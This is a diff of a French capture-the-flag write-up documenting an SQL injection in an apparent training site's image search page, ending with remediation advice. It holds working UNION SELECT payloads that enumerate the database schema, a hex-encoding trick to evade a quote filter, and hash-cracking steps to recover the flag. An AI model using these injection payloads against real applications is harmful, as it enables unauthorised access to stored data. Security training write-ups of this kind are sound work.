@@ -1,21 +1,47 @@
 Faille identifiée : SQL Injection
 Page: /?page=searchimg
 
-Définition :
-L’injection SQL est une vulnérabilité qui se produit lorsqu’une application insère directement des données provenant de l’utilisateur
-dans une requête SQL sans les filtrer ou les préparer correctement.
-Cela permet à un attaquant de modifier le comportement de la requête et d’accéder à des données qu’il ne devrait pas voir.
+Description:
+	L’injection SQL est une vulnérabilité qui se produit lorsqu’une application insère directement des données provenant de l’utilisateur
+	dans une requête SQL sans les filtrer ou les préparer correctement.
+	Cela permet à un attaquant de modifier le comportement de la requête et d’accéder à des données qu’il ne devrait pas voir.
 
-Dans notre cas :
-Le site a un formulaire pour chercher un membre par son ID.
-Le champ ID est utilisé directement dans une requête SQL.
-On a pu injecter des commandes SQL comme :
+Exploitation:
+	Le site a un formulaire pour chercher une image par son ID.
+	Le champ ID est utilisé directement dans une requête SQL qui doit ressembler à ceci :
+		SELECT * FROM list_images WHERE id = $USER_INPUT;
+	En injectant des commandes SQL dans le champ ID, nous pouvons modifier cette requête pour obtenir des informations supplémentaires de la base de données.
 
-Trouver les noms de la table :
-1 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() -- 
+	Nous commençons toutes nos injections par "1 UNION SELECT".
+	Le 1 sert a completer la requête initiale (SELECT * FROM list_images WHERE id = 1)
+	Le UNION SELECT permet de combiner le résultat de notre requête avec une autre requête SQL que nous allons définir juste après.
 
-Trouver les column_name :
-1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573
+	toutes nos requêtes se terminent par "--" qui permet de commenter le reste de la requête initiale.
 
+	Nous pouvons donc construire nos requêtes d'injection en plusieurs étapes.
 
-1 UNION ALL SELECT 1, comment FROM list_images WHERE id=5 --
+	Trouver les noms de la table :
+		1 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() -- 
+
+	Trouver les column_name :
+		1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573
+
+	(le 0x6c6973745f696d61676573 est la version hexadécimale de "list_images" car les guillemets sont filtrés par le site)
+
+	Et afficher le champ comment qui contient les instructions pour trouver le flag :
+		1 UNION ALL SELECT 1, comment FROM list_images WHERE id=5 --
+
+	ce qui renvoie:
+		Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+	
+	Nous avons donc suivi les instruction.
+	Nous sommes allés sur le site crackstation.net pour decoder le md5 1928e8083cf461a51303633093573c46 ce qui donne "albatroz"
+	Et nous avons encrypté le résultat en SHA256 avec cette commande:
+		echo -n "albatroz" | sha256sum
+
+	ce qui nous a donné le flag.
+
+Correctifs :
+	- Utiliser des fonctions de requêtes préparées (prepared statements) avec des paramètres liés.
+	- Valider et filtrer les entrées utilisateur pour s’assurer qu’elles correspondent aux formats attendus.
+	- Limiter les privilèges de la base de données pour minimiser les dégâts en cas d’injection réussie.
